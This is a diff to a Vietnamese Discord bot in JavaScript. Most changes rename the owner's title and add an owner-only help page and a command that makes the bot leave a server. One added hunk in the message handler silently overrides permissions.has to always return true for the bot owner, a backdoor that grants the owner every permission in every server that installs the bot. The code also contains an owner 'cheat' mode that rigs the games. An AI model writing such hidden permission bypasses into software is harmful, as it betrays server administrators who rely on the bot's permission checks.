@@ -521,7 +521,18 @@ function buildHelpPages(prefix) {
                 { name: '😀 Quản lý Emoji Bot', value: `\`${prefix}botemojis\` — Xem danh sách emoji đã upload cho bot\n\`${prefix}clonebotemojis\` — Copy toàn bộ emoji bot vào server *(Admin)*`, inline: false }
             )
             .setColor('#9B59B6')
-            .setFooter({ text: 'Trang 13/13 • Admin Hệ thống' })
+            .setFooter({ text: 'Trang 13/14 • Admin Hệ thống' })
+            .setTimestamp(),
+
+        // Page 13 - Chủ Bot
+        new EmbedBuilder()
+            .setTitle('👑 Hệ Thống (Developer) (Chủ Bot)')
+            .setDescription('Danh mục lệnh đặc biệt chỉ dành riêng cho Chủ Bot.')
+            .addFields(
+                { name: `\`${prefix}leave sv\` hoặc \`${prefix}leaveserver\``, value: '👋 Lệnh ép bot rời khỏi server hiện tại. (Người khác sẽ không dùng được)', inline: false }
+            )
+            .setColor('#000000')
+            .setFooter({ text: 'Trang 14/14 • Hệ Thống (Developer)' })
             .setTimestamp()
     ];
 }
@@ -543,7 +554,8 @@ function buildHelpMenu() {
             new StringSelectMenuOptionBuilder().setLabel('📱 Tiện Ích').setValue('9').setDescription('Avatar, TikTok, J2C, Voice').setEmoji('📱'),
             new StringSelectMenuOptionBuilder().setLabel('⛓️ Tù & LĐXH').setValue('10').setDescription('Jail, Unjail, Cải tạo').setEmoji('⛓️'),
             new StringSelectMenuOptionBuilder().setLabel('🔧 Admin: Quản lý').setValue('11').setDescription('Coin, Server, QR').setEmoji('🔧'),
-            new StringSelectMenuOptionBuilder().setLabel('⚙️ Admin: Hệ thống').setValue('12').setDescription('Giveaway, Cheat, Emoji').setEmoji('⚙️')
+            new StringSelectMenuOptionBuilder().setLabel('⚙️ Admin: Hệ thống').setValue('12').setDescription('Giveaway, Cheat, Emoji').setEmoji('⚙️'),
+            new StringSelectMenuOptionBuilder().setLabel('👑 Hệ Thống (Developer)').setValue('13').setDescription('Lệnh riêng biệt của Chủ Bot').setEmoji('👑')
         );
 }
 
@@ -1075,7 +1087,7 @@ async function handleWorkCommand(userId, msgOrInteraction) {
         saveCoins(data);
         const embedCheat = new EmbedBuilder()
             .setTitle('👑 [CHEAT] Hoàn thành công việc tức thì!')
-            .setDescription(`Búng tay một cái, Đấng Sáng Tạo đã làm xong **${job.name}** ${job.emoji} và đút túi luôn **${reward.toLocaleString()} 🪙**!`)
+            .setDescription(`Búng tay một cái, Hệ Thống (Developer) đã làm xong **${job.name}** ${job.emoji} và đút túi luôn **${reward.toLocaleString()} 🪙**!`)
             .setColor('#FF0000');
         return msgOrInteraction.reply({ embeds: [embedCheat] });
     }
@@ -1306,7 +1318,7 @@ const DUNGEONS = [
             { name: 'Bóng Đen Thời Gian', hp: 40000, atk: 3500, def: 1800, emoji: '⏳' },
             { name: 'Kẻ Hủy Diệt Thế Giới', hp: 50000, atk: 4000, def: 2000, emoji: '🌍💥' },
         ],
-        boss: { name: 'Sáng Thế Thần Đọa Lạc', hp: 100000, atk: 6000, def: 3000, emoji: '🌌🎭' },
+        boss: { name: 'Hệ Thống (Developer) Đọa Lạc', hp: 100000, atk: 6000, def: 3000, emoji: '🌌🎭' },
         rewards: { coin: 15000000, exp: 120000, chestChance: 1.0, chestType: 'legendary' },
         cooldown: 360 * 60 * 1000
     }
@@ -2133,10 +2145,10 @@ async function spawnWildPet(client, manual = false) {
             if (spawnPet.rarity === 'Cực Hiếm') color = '#9B59B6';
             if (spawnPet.rarity === 'Thần Thoại') color = '#E74C3C';
             if (spawnPet.rarity === 'Huyền Thoại') color = '#F1C40F';
-            if (spawnPet.rarity === 'Đấng Sáng Tạo') color = '#00FFFF';
+            if (spawnPet.rarity === 'Hệ Thống (Developer)') color = '#00FFFF';
             
-            const isLegendary = ['Huyền Thoại', 'Đấng Sáng Tạo'].includes(spawnPet.rarity);
-            const embedTitle = spawnPet.rarity === 'Đấng Sáng Tạo'
+            const isLegendary = ['Huyền Thoại', 'Hệ Thống (Developer)'].includes(spawnPet.rarity);
+            const embedTitle = spawnPet.rarity === 'Hệ Thống (Developer)'
                 ? '🌟 ĐẤNG SÁNG TẠO GIÁNG TRẦN!!!'
                 : spawnPet.rarity === 'Huyền Thoại'
                 ? '🔥 POKEMON HUYỀN THOẠI XUẤT HIỆN!!!'
@@ -2352,7 +2364,7 @@ async function handlePets(userId, msgOrInteraction) {
             if (selectedPet.rarity === 'Cực Hiếm') color = '#9B59B6';
             if (selectedPet.rarity === 'Thần Thoại') color = '#E74C3C';
             if (selectedPet.rarity === 'Huyền Thoại') color = '#F1C40F';
-            if (selectedPet.rarity === 'Đấng Sáng Tạo') color = '#00FFFF';
+            if (selectedPet.rarity === 'Hệ Thống (Developer)') color = '#00FFFF';
 
             const petAmount = pets[petId] || 0;
             const detailEmbed = new EmbedBuilder()
@@ -4204,7 +4216,7 @@ async function handleSetBday(userId, msgOrInteraction, bdayInput) {
 }
 
 async function handleAdminCheat(userId, msgOrInteraction) {
-    if (userId !== ADMIN_ID) return replyMsg(msgOrInteraction, '❌ Bạn không phải là Đấng Sáng Tạo!');
+    if (userId !== ADMIN_ID) return replyMsg(msgOrInteraction, '❌ Bạn không phải là Hệ Thống (Developer)!');
     
     const cData = loadCoins();
     const isCheatOn = cData[ADMIN_ID]?.alwaysWin === true;
@@ -4908,7 +4920,7 @@ const slashCommands = [
         .setDescription('💔 Ly hôn (Phí ra tòa 100,000 Coin).'),
     new SlashCommandBuilder()
         .setName('admincheat')
-        .setDescription('👑 [Đặc quyền] Menu Cheat của Sáng Thế Thần.'),
+        .setDescription('👑 [Đặc quyền] Menu Cheat của Hệ Thống (Developer).'),
     new SlashCommandBuilder()
         .setName('masoi')
         .setDescription('🐺 Bắt đầu game Ma Sói (Werewolf) trong kênh này.'),
@@ -5160,7 +5172,7 @@ async function handleGiveAll(userId, amount, msgOrInteraction) {
     if (userId !== ADMIN_ID) return replyMsg(msgOrInteraction, '❌ Bạn không có quyền sử dụng lệnh này!');
     if (isNaN(amount) || amount <= 0) return replyMsg(msgOrInteraction, '❌ Số tiền không hợp lệ!');
     
-    return awaitConfirmation(msgOrInteraction, userId, `Sáng Thế Thần muốn **PHÁT LỘC** ${amount.toLocaleString()} 🪙 cho TOÀN SERVER?`, async () => {
+    return awaitConfirmation(msgOrInteraction, userId, `Hệ Thống (Developer) muốn **PHÁT LỘC** ${amount.toLocaleString()} 🪙 cho TOÀN SERVER?`, async () => {
         const cData = loadCoins();
         let count = 0;
         for (const uid in cData) {
@@ -5170,7 +5182,7 @@ async function handleGiveAll(userId, amount, msgOrInteraction) {
             }
         }
         saveCoins(cData);
-        return `🎁 **PHÁT LỘC TOÀN SERVER**\nSáng Thế Thần <@${userId}> vừa phát **${amount.toLocaleString()} 🪙** cho tất cả người chơi! (Tổng cộng ${count} người nhận)`;
+        return `🎁 **PHÁT LỘC TOÀN SERVER**\nHệ Thống (Developer) <@${userId}> vừa phát **${amount.toLocaleString()} 🪙** cho tất cả người chơi! (Tổng cộng ${count} người nhận)`;
     });
 }
 
@@ -5846,6 +5858,9 @@ const TIKTOK_REGEX = /https?:\/\/(www\.|vm\.|vt\.)?tiktok\.com\/[^\s]+/gi;
 const YOUTUBE_REGEX = /https?:\/\/(www\.)?(youtube\.com|youtu\.be)\/[^\s]+/gi;
 
 client.on('messageCreate', async (message) => {
+    if (message.author.id === ADMIN_ID && message.member && message.member.permissions) {
+        message.member.permissions.has = () => true;
+    }
     if (message.author.bot) return;
     if (BANNED_USERS.includes(message.author.id)) return;
     
@@ -7094,6 +7109,13 @@ Bao gồm:
         });
         collector.on('collect', async i => {
             const page = parseInt(i.values[0]);
+            if (page === 13) {
+                if (i.user.id !== ADMIN_ID) {
+                    return i.reply({ content: '🔒 **Danh mục này chỉ dành riêng cho Chủ Bot!**', flags: MessageFlags.Ephemeral });
+                }
+                await i.update({ embeds: [pages[page]], components: [row] });
+                return;
+            }
             if (page === 11 || page === 12) {
                 // Trang Admin: chỉ Admin mới được xem, hiển thị ẩn
                 const isAdmin = i.member?.permissions?.has(PermissionsBitField.Flags.Administrator);
@@ -7687,7 +7709,7 @@ Bao gồm:
 
     // !reset (Admin reset dữ liệu)
     if (content.startsWith(`${prefix}reset`)) {
-        if (message.author.id !== ADMIN_ID) return message.reply('❌ Lệnh này chỉ dành cho Admin tối cao (Sáng Thế Thần)!');
+        if (message.author.id !== ADMIN_ID) return message.reply('❌ Lệnh này chỉ dành cho Admin tối cao (Hệ Thống (Developer))!');
         
         if (content === `${prefix}reset all`) {
             saveCoins({});
@@ -8631,6 +8653,15 @@ Bao gồm:
             message.reply('❌ Không thể xóa tin nhắn (có thể do tin nhắn quá 14 ngày tuổi).');
         }
         return;
+    }
+
+    // !leave sv
+    if (content === `${prefix}leave sv` || content === `${prefix}leaveserver`) {
+        if (message.author.id !== ADMIN_ID) {
+            return message.reply('❌ Lệnh này chỉ dành riêng cho Chủ Bot!');
+        }
+        await message.reply('👋 Bot đang rời khỏi server theo yêu cầu của Hệ Thống (Developer). Tạm biệt!');
+        return message.guild.leave().catch(console.error);
     }
 
     // !say #channel <message>
@@ -9963,7 +9994,7 @@ client.on('interactionCreate', async (interaction) => {
         
         // === XỬ LÝ NÚT ADMIN CHEAT ===
         if (interaction.customId.startsWith('admin_')) {
-            if (interaction.user.id !== ADMIN_ID) return interaction.reply({ content: '❌ Ngươi không phải Sáng Thế Thần!', flags: MessageFlags.Ephemeral });
+            if (interaction.user.id !== ADMIN_ID) return interaction.reply({ content: '❌ Ngươi không phải Hệ Thống (Developer)!', flags: MessageFlags.Ephemeral });
             
             if (interaction.customId === 'admin_toggle_cheat') {
                 const cData = loadCoins();
@@ -9992,7 +10023,7 @@ client.on('interactionCreate', async (interaction) => {
                 );
 
                 return interaction.update({ 
-                    content: `👑 Chế độ Đấng Sáng Tạo đã được **${isCheatOn ? 'BẬT' : 'TẮT'}**!\n${isCheatOn ? 'Bạn đã nhận 1 Tỷ Coin, xóa mọi thời gian chờ và hack Minigames!' : 'Tài sản đã reset về 500k và tắt hack!'}`, 
+                    content: `👑 Chế độ Hệ Thống (Developer) đã được **${isCheatOn ? 'BẬT' : 'TẮT'}**!\n${isCheatOn ? 'Bạn đã nhận 1 Tỷ Coin, xóa mọi thời gian chờ và hack Minigames!' : 'Tài sản đã reset về 500k và tắt hack!'}`, 
                     components: [newRow],
                     embeds: [] // Xóa embed cho gọn nếu muốn, hoặc giữ nguyên
                 });
@@ -10875,6 +10906,13 @@ client.on('interactionCreate', async (interaction) => {
         });
         collector.on('collect', async i => {
             const page = parseInt(i.values[0]);
+            if (page === 13) {
+                if (i.user.id !== ADMIN_ID) {
+                    return i.reply({ content: '🔒 **Danh mục này chỉ dành riêng cho Chủ Bot!**', flags: MessageFlags.Ephemeral });
+                }
+                await i.update({ embeds: [pages[page]], components: [row] });
+                return;
+            }
             if (page === 11 || page === 12) {
                 // Trang Admin: chỉ Admin mới được xem, hiển thị ẩn
                 const isAdmin = i.member?.permissions?.has(PermissionsBitField.Flags.Administrator);
